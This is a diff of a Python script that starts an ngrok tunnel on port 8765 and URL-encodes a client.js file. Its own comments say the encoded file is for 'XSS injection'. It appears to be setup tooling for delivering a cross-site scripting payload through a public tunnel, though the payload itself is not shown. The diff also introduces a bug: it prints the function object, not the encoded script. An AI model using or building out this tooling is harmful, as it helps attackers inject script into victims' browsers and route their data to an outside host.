@@ -2,6 +2,7 @@ import os
 import subprocess
 import time
 import json
+import base64
 import urllib.parse
 
 # Check if Ngrok is installed
@@ -13,15 +14,10 @@ def check_ngrok_installed():
         print("Ngrok is not installed. Please install Ngrok and try again.")
         return False
 
-# Start Ngrok HTTP tunnel on port 8765 in a new terminal
+# Start Ngrok HTTP tunnel on port 8765
 def start_ngrok():
     print("Starting Ngrok HTTP tunnel on port 8765...")
-    
-    # Check platform (Windows or Unix-based)
-    if os.name == 'nt':  # For Windows
-        ngrok_process = subprocess.Popen(["start", "cmd", "/K", "ngrok", "http", "8765"], shell=True)
-    else:  # For Linux or macOS
-        ngrok_process = subprocess.Popen(["gnome-terminal", "--", "bash", "-c", "ngrok http 8765; exec bash"])
+    ngrok_process = subprocess.Popen(["ngrok", "http", "8765"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     # Wait for Ngrok to start and get the public URL
     time.sleep(3)  # Give Ngrok a few seconds to start
@@ -67,7 +63,6 @@ def url_encode_client_js():
     # URL encode the content of client.js
     encoded_js = urllib.parse.quote(client_js)
     return encoded_js
-
 # Main function to run the process
 def main():
     if not check_ngrok_installed():
@@ -88,7 +83,7 @@ def main():
 
     # Encode client.js for use in URL (in case of XSS)
     encoded_client_js = url_encode_client_js()
-    print(f"\nClient.js URL-encoded for XSS injection:\n{encoded_client_js}")
+    print(f"\nClient.js URL-encoded for XSS injection:\n{url_encode_client_js}")
 
 if __name__ == '__main__':
     main()
